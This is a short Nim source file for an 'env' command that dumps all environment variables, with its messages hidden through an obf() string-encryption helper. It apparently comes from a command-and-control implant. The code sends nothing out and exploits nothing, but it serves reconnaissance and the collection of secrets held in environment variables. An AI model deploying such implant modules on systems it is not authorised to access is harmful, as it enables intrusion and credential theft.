#[
    Cross-Platform env Command
    Lists environment variables
    Compatible with all platforms
]#

import os, strutils
import ../../util/strenc

# Cross-platform env implementation
proc env*(): string =
    try:
        when defined verbose:
            echo obf("DEBUG: Listing environment variables")
        
        var envList = ""
        
        # Get all environment variables
        for key, value in envPairs():
            envList.add(key & "=" & value & "\n")
        
        if envList != "":
            return envList.strip()
        else:
            return obf("No environment variables found")
            
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: env command failed: ") & e.msg
        return obf("ERROR: env command failed - ") & e.msg 